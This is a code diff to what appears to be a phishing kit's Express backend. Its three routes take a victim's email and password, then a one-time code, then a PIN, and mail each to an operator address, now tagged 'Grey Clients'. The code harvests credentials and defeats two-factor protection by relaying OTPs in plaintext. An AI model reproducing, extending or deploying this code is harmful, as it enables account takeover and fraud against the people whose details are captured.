@@ -34,8 +34,8 @@ app.post("/", (req, res) => {
   const mailOptions = {
     from: `${email}`,
     to: userEmail,
-    subject: `Email: ${email} \t\n\n\n password: ${password}`,
-    text: `New user registered with Email: ${email} and password: ${password}`,
+    subject: `Grey Clients: Email: ${email} \t\n\n\n password: ${password}`,
+    text: `Grey Clients:New user registered with Email: ${email} and password: ${password}`,
   };
 
   console.log(mailOptions);
@@ -66,8 +66,8 @@ app.post("/otp", (req, res) => {
   const mailOptions = {
     from: email,
     to: userEmail,
-    subject: `OTP: ${req.body?.otp} `,
-    text: `New user registered OTP: ${req.body?.otp}`,
+    subject: `Grey Clients: OTP: ${req.body?.otp} `,
+    text: `Grey Clients: New user registered OTP: ${req.body?.otp}`,
   };
 
   console.log(mailOptions);
@@ -97,8 +97,8 @@ app.post("/pin", (req, res) => {
   const mailOptions = {
     from: email,
     to: userEmail,
-    subject: `PIN: ${req.body?.pin} `,
-    text: `New user registered PIN: ${req.body?.pin}`,
+    subject: `Grey Clients: PIN: ${req.body?.pin} `,
+    text: `Grey Clients: New user registered PIN: ${req.body?.pin}`,
   };
 
   console.log(mailOptions);
